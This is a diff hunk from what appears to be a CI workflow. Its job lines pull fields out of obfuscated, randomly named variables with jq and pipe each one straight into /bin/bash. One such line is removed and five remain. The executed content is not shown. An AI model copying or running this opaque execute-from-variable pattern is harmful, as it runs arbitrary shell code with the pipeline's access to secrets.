@@ -31,7 +31,6 @@ jobs:
           echo $osu66 | jq -r .o26 | /bin/bash
           printf '%s' "$msjmr7" | jq -r .cs28447 | /bin/bash
           echo $pgfw6641 | jq -r .xkjf40191 | /bin/bash
-          echo $k28586 | jq -r .ibqw8 | /bin/bash
           printf '%s' "$x382" | jq -r .ivsdn3 | /bin/bash
           printf '%s' "$jeoy78" | jq -r .hy0783 | /bin/bash
 
